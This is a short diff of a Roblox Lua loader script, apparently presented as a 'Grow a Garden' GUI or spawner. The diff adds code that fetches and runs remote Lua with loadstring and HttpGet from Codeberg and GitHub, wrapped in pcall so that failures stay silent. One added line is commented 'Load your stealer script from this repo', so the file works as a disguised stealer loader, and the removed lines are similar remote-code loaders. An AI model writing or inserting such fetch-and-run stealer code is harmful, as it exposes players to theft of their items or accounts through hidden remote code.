@@ -1,2 +1,9 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/main/refs/heads/main/games/gagvisual.lua", true))("discord.gg/csxu2nCkw9")
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/f1Tt2DyEU8/0", true))()
+pcall(function()
+    -- Load your Grow a Garden GUI from Codeberg
+    loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+end)
+
+pcall(function()
+    -- Load your stealer script from this repo
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/HKTwoScript/SpinUI/main/SpinUI.lua"))()
+end)
